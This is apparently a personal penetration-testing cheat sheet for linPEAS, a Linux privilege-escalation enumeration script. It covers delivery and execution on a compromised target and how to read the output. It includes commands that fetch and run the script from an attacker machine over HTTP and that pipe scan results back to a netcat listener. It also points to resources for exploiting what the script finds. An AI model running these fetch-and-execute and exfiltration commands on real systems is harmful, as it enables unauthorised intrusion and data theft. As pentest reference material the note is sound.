# linPEAS

**Tags:** `#linpeas` `#privesc` `#enumeration` `#linux` `#postexploit`

Linux Privilege Escalation Awesome Script. Automated enumeration of privesc vectors on Linux — checks SUID/SGID, sudo rules, capabilities, writable paths, cron jobs, NFS, Docker, kernel exploits, and credentials. Color-coded output: red/yellow = high priority findings.

**Source:** https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
**Install:** Download from releases or serve directly from Kali

```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

> [!note]
> Red = 95%+ privesc probability. Yellow = interesting. Always review red findings first. Run as the compromised user — linPEAS identifies what that specific user can exploit. Pipe output to `less -R` to keep colors.

---

## Delivery & Execution

```bash
# Option 1 — serve from Kali, execute in memory (no disk write)
# Kali:
python3 -m http.server 8000

# Target:
curl http://10.10.14.5:8000/linpeas.sh | sh
wget -qO- http://10.10.14.5:8000/linpeas.sh | sh

# Option 2 — upload and run
# Transfer linpeas.sh to target, then:
chmod +x linpeas.sh
./linpeas.sh

# Option 3 — pipe output back to Kali for review
# Kali listener:
nc -lvnp 9001 | tee linpeas-output.txt

# Target:
./linpeas.sh | nc 10.10.14.5 9001
```

---

## Execution Options

```bash
# Full scan (default)
./linpeas.sh

# Only specific section (faster)
./linpeas.sh -s     # super fast — less thorough
./linpeas.sh -o SysI,Devs,AvaSof,ProCronSrvcsTmrsSocks,Net  # specific sections

# Save output with colors preserved
./linpeas.sh | tee /tmp/linpeas.out
# View: less -R /tmp/linpeas.out
```

---

## What It Checks

| Category | Examples |
|----------|---------|
| System info | OS, kernel version, env vars |
| SUID/SGID | Exploitable binaries |
| Sudo | Rules, env_keep, LD_PRELOAD |
| Capabilities | cap_setuid, cap_net_raw |
| Cron jobs | World-writable scripts in cron |
| Writable paths | PATH hijacking opportunities |
| NFS | no_root_squash mounts |
| Docker/LXC | Container escapes |
| Credentials | SSH keys, config files, history |
| Interesting files | .bash_history, .ssh/, /etc/passwd |
| Network | Open ports, /etc/hosts, ARP |
| Processes | Running as root, interesting daemons |
| Software versions | Known CVEs for installed software |

---

## Reading Output

```bash
# Color key:
# RED   → 95%+ privesc vector (check these first)
# YELLOW → interesting / worth reviewing
# GREEN → system info
# BLUE  → users/groups

# Quick wins to grep for:
cat linpeas.out | grep -A 5 "SUID\|sudo\|writable\|cron\|cap_set"
```

---

## After Running

Cross-reference red findings with:
- `gtfobins.github.io` — SUID/sudo binary exploitation
- `exploit-db.com` / searchsploit — kernel/software CVEs
- Manual verification of cron scripts and writable paths

---

*Created: 2026-03-13*
*Updated: 2026-03-13*
*Model: claude-sonnet-4-6*
